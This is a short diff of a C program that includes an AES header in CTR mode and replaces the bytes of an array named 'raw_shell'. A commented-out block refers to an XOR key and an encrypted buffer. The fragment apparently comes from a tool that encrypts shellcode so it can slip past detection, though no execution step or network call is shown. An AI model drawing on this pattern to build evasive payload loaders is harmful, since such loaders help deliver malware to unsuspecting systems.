@@ -2,7 +2,7 @@
 #include "aes.h"
 #define CTR 1
 int main(int argc, char*argv[]) {
-uint8_t raw_shell[] =  "\xec\xec\xfc\x5d\x5e\xc9\x7a\xd0\xbb\xb1\x70\xb3\xd4\x15\x02";
+uint8_t raw_shell[] =  "\x9e\x45\xab\x7e\xfd\x23\x1d\x70\xaa\x2c\x4e\x30\xa9\xb2\x9b";
 /*int i;
 char key = '!';
 printf("encrypted buffer\n");
